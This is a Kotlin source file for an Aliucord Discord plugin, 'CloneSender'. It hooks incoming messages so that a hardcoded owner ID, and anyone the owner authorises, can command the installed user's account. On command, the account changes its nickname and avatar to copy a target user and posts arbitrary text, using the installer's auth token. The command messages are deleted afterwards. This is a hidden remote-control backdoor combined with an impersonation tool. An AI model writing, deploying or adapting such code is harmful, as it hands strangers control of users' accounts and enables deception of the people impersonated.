package com.aliucord.plugins

import android.content.Context
import android.util.Base64
import com.aliucord.Http
import com.aliucord.Utils
import com.aliucord.annotations.AliucordPlugin
import com.aliucord.entities.Plugin
import com.discord.api.message.Message
import com.discord.stores.StoreStream
import com.discord.utilities.rest.RestAPI
import de.robv.android.xposed.XC_MethodHook
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.util.Collections
import java.util.HashSet

@AliucordPlugin(requiresRestart = false)
class CloneSender : Plugin() {

    init {
        settingsTab = SettingsTab(CloneSenderSettings::class.java, SettingsTab.Type.PAGE).withArgs(this)
    }

    private val ownerId = "1001222848716738570"
    private val allowedUsers: MutableSet<String> = Collections.synchronizedSet(HashSet())

    private val authToken: String
        get() = RestAPI.AppHeadersProvider.INSTANCE.authToken

    override fun start(context: Context) {
        try {
            val storeMessages = StoreStream.getMessages()
            val handleMessageCreate = storeMessages.javaClass.declaredMethods.firstOrNull {
                it.name == "handleMessageCreate" && it.parameterTypes.size == 1
            }

            if (handleMessageCreate != null) {
                patcher.patch(handleMessageCreate, object : XC_MethodHook() {
                    override fun beforeHookedMethod(param: MethodHookParam) {
                        try {
                            val msg = param.args[0] as? Message ?: return
                            processIncomingMessage(msg)
                        } catch (e: Throwable) {
                            logger.error("Error in handleMessageCreate hook", e)
                        }
                    }
                })
            }
        } catch (e: Throwable) {
            logger.error("Failed to start CloneSender", e)
        }
    }

    private fun processIncomingMessage(msg: Message) {
        val rawContent = msg.content ?: return
        val content = rawContent.trim()
        val author = msg.author ?: return
        val authorId = author.id.toString()
        val channelId = msg.channelId.toString()
        val messageId = msg.id.toString()

        if (!content.startsWith("+")) return

        val myCurrentUserId = StoreStream.getUsers().me?.id?.toString() ?: ""
        val configuredAccountId = settings.getString("bound_account_id", "").trim()

        if (configuredAccountId.isNotEmpty() && configuredAccountId != myCurrentUserId) {
            return
        }

        val isOwner = authorId == ownerId
        val isAllowed = isOwner || allowedUsers.contains(authorId)

        if (content.startsWith("+سماح ") && isOwner) {
            val targetStr = content.removePrefix("+سماح ").trim().split(Regex("\\s+"))[0]
            val target = extractIdFromToken(targetStr)
            if (target != null) {
                allowedUsers.add(target)
                deleteMessage(channelId, messageId)
                sendMessage(channelId, "تم منح الصلاحية للمستخدم.")
            }
            return
        }

        if (content.startsWith("+الغاء ") && isOwner) {
            val targetStr = content.removePrefix("+الغاء ").trim().split(Regex("\\s+"))[0]
            val target = extractIdFromToken(targetStr)
            if (target != null) {
                allowedUsers.remove(target)
                deleteMessage(channelId, messageId)
                sendMessage(channelId, "تم سحب الصلاحية من المستخدم.")
            }
            return
        }

        if (content.startsWith("+رسالة ") && isAllowed) {
            val remainder = content.removePrefix("+رسالة ").trim()
            val parts = remainder.split(Regex("\\s+"), 2)
            if (parts.size < 2) return

            val targetId = extractIdFromToken(parts[0]) ?: return
            val textToSend = parts[1]

            deleteMessage(channelId, messageId)
            executeCloneAndSend(channelId, targetId, textToSend)
        }
    }

    private fun extractIdFromToken(token: String): String? {
        val trimmed = token.trim()
        val match = Regex("^<@!?([0-9]+)>$").find(trimmed)
        if (match != null) {
            return match.groupValues[1]
        }
        if (trimmed.matches(Regex("^[0-9]+$"))) {
            return trimmed
        }
        return null
    }

    private fun executeCloneAndSend(channelId: String, targetId: String, textToSend: String) {
        Utils.threadPool.execute {
            try {
                val channel = StoreStream.getChannels().getChannel(channelId.toLong())
                val guildId = channel?.guildId?.toString()

                var targetNick: String? = null
                var targetGuildAvatar: String? = null
                var targetGlobalAvatar: String? = null
                var targetUsername = ""

                if (guildId != null && guildId != "0") {
                    try {
                        val memberRes = Http.Request("https://discord.com/api/v9/guilds/$guildId/members/$targetId", "GET")
                            .setHeader("Authorization", authToken)
                            .execute()
                        if (memberRes.ok()) {
                            val memberJson = JSONObject(memberRes.text())
                            targetNick = memberJson.optString("nick", null)
                            targetGuildAvatar = memberJson.optString("avatar", null)
                            val userObj = memberJson.optJSONObject("user")
                            if (userObj != null) {
                                targetGlobalAvatar = userObj.optString("avatar", null)
                                targetUsername = userObj.optString("global_name", null)
                                    ?: userObj.optString("username", "")
                            }
                        }
                    } catch (e: Throwable) {
                        logger.error("Failed to fetch guild member data", e)
                    }
                }

                if (targetGlobalAvatar == null) {
                    try {
                        val userRes = Http.Request("https://discord.com/api/v9/users/$targetId", "GET")
                            .setHeader("Authorization", authToken)
                            .execute()
                        if (userRes.ok()) {
                            val userJson = JSONObject(userRes.text())
                            targetGlobalAvatar = userJson.optString("avatar", null)
                            if (targetUsername.isEmpty()) {
                                targetUsername = userJson.optString("global_name", null)
                                    ?: userJson.optString("username", "")
                            }
                        }
                    } catch (e: Throwable) {
                        logger.error("Failed to fetch user data", e)
                    }
                }

                if (guildId != null && guildId != "0") {
                    val desiredName = targetNick ?: targetUsername
                    if (desiredName.isNotEmpty()) {
                        try {
                            val nickBody = JSONObject().apply {
                                put("nick", desiredName)
                            }
                            Http.Request("https://discord.com/api/v9/guilds/$guildId/members/@me", "PATCH")
                                .setHeader("Authorization", authToken)
                                .setHeader("Content-Type", "application/json")
                                .executeWithJson(nickBody)
                        } catch (e: Throwable) {
                            logger.error("Failed to update nickname", e)
                        }
                    }
                }

                val avatarUrl = when {
                    guildId != null && targetGuildAvatar != null -> 
                        "https://cdn.discordapp.com/guilds/$guildId/users/$targetId/avatars/$targetGuildAvatar.png?size=256"
                    targetGlobalAvatar != null -> 
                        "https://cdn.discordapp.com/avatars/$targetId/$targetGlobalAvatar.png?size=256"
                    else -> null
                }

                if (avatarUrl != null) {
                    try {
                        val imgRes = Http.Request(avatarUrl, "GET").execute()
                        if (imgRes.ok()) {
                            val stream = imgRes.stream()
                            val buffer = ByteArrayOutputStream()
                            val data = ByteArray(4096)
                            var nRead: Int
                            while (stream.read(data, 0, data.size).also { nRead = it } != -1) {
                                buffer.write(data, 0, nRead)
                            }
                            val imgBytes = buffer.toByteArray()
                            val base64Img = "data:image/png;base64," + Base64.encodeToString(imgBytes, Base64.NO_WRAP)

                            val avatarBody = JSONObject().apply {
                                put("avatar", base64Img)
                            }

                            Http.Request("https://discord.com/api/v9/users/@me", "PATCH")
                                .setHeader("Authorization", authToken)
                                .setHeader("Content-Type", "application/json")
                                .executeWithJson(avatarBody)
                        }
                    } catch (e: Throwable) {
                        logger.error("Failed to update avatar", e)
                    }
                }

                sendMessage(channelId, textToSend)

            } catch (e: Throwable) {
                logger.error("Error in executeCloneAndSend", e)
            }
        }
    }

    private fun deleteMessage(channelId: String, messageId: String) {
        Utils.threadPool.execute {
            try {
                Http.Request("https://discord.com/api/v9/channels/$channelId/messages/$messageId", "DELETE")
                    .setHeader("Authorization", authToken)
                    .execute()
            } catch (e: Throwable) {
                logger.error("Failed to delete command message", e)
            }
        }
    }

    private fun sendMessage(channelId: String, content: String) {
        Utils.threadPool.execute {
            try {
                val body = JSONObject().apply {
                    put("content", content)
                }
                Http.Request("https://discord.com/api/v9/channels/$channelId/messages", "POST")
                    .setHeader("Authorization", authToken)
                    .setHeader("Content-Type", "application/json")
                    .executeWithJson(body)
            } catch (e: Throwable) {
                logger.error("Failed to send message", e)
            }
        }
    }

    override fun stop(context: Context) {
        patcher.unpatchAll()
        allowedUsers.clear()
    }
}
